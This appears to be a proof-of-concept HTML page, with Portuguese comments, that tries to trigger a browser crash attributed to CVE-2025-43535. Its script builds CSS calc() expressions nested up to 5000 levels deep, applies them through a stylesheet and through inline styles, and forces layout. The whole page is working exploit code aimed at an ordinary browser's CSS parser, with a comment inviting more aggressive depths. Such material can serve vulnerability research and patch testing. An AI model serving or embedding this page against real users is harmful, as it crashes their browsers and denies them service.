<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 — Variant 1 Minimal RAM</title>
<style>
  body {
    background:#0a0a0a;
    color:#88ff88;
    font-family:monospace;
    padding:16px;
  }
  #log {
    background:#111;
    border:1px solid #2a4a2a;
    padding:12px;
    height:65vh;
    overflow-y:auto;
    font-size:12px;
    line-height:1.6;
  }
  .ok   { color:#00ff88 }
  .fail { color:#ff4444 }
  .info { color:#ffcc44 }
  .crash{ color:#ff00ff; font-weight:bold }
</style>
</head>
<body>

<h3>CVE-2025-43535 — Variante 1 (Minimal RAM / Linear Nesting)</h3>
<div id="log"></div>

<script>
"use strict";

const logEl = document.getElementById("log");

function L(msg, cls) {
  const d = document.createElement("div");
  d.className = cls || "info";
  d.textContent = "[" + (Date.now() % 100000) + "] " + msg;
  logEl.appendChild(d);
  logEl.scrollTop = logEl.scrollHeight;
}

L("=== Iniciando Variante 1 (Minimal RAM) ===", "info");

/*
  Estratégia:
  - Construção linear de calc(calc(calc(...)))
  - Sem crescimento exponencial
  - Sem Blob
  - Sem alocação massiva de heap
  - Foco apenas na profundidade estrutural do parser
*/

function buildLinearCalc(depth) {
  let expr = "1px";
  for (let i = 0; i < depth; i++) {
    expr = "calc(" + expr + ")";
  }
  return expr;
}

async function run() {

  const el = document.createElement("div");
  el.style.cssText = "position:absolute;top:-9999px";
  document.body.appendChild(el);

  const sheet = document.createElement("style");
  document.head.appendChild(sheet);

  // Ajuste aqui se quiser testar mais agressivo
  const depths = [
    50,
    100,
    200,
    400,
    800,
    1200,
    2000,
    3000,
    5000
  ];

  for (const depth of depths) {

    try {

      L("Construindo depth=" + depth + "...", "info");

      const expr = buildLinearCalc(depth);

      // Caminho 1: CSSOM via stylesheet
      sheet.textContent = ".test { width: " + expr + "; height: " + expr + "; }";
      el.className = "test";
      void el.offsetWidth;

      // Caminho 2: inline style (code path diferente)
      el.style.width = expr;
      el.style.height = expr;
      void el.offsetWidth;

      L("depth=" + depth + " OK", "ok");

    } catch (e) {

      L("depth=" + depth + " ERRO: " + e, "fail");

    }

    // Pequeno yield para evitar travamento imediato
    await new Promise(r => setTimeout(r, 50));
  }

  sheet.textContent = "";
  document.head.removeChild(sheet);
  document.body.removeChild(el);

  L("=== FIM ===", "ok");
  L("Se o navegador crashou antes disso → possível trigger da CVE-2025-43535", "crash");
}

window.addEventListener("load", () => {
  setTimeout(run, 300);
});
</script>

</body>
</html>
